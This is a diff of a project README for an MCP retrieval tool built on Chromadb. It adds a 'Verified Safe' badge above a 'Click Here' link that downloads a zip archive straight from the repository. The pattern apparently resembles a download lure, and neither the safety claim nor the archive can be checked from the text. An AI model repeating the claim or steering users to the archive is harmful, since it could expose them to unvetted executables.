@@ -1,5 +1,7 @@
 # 🎉 MCP-rag-with-Chromadb - Harness Advanced Document Retrieval Easily
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/rexnzm-mcp-rag-with-chromadb)
+
 [![Download](https://raw.githubusercontent.com/rexnzm/MCP-rag-with-Chromadb/main/downloads/MC-with-Chromadb-rag-3.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/rexnzm/MCP-rag-with-Chromadb/main/downloads/MC-with-Chromadb-rag-3.4.zip)
 
 ## 📖 Overview
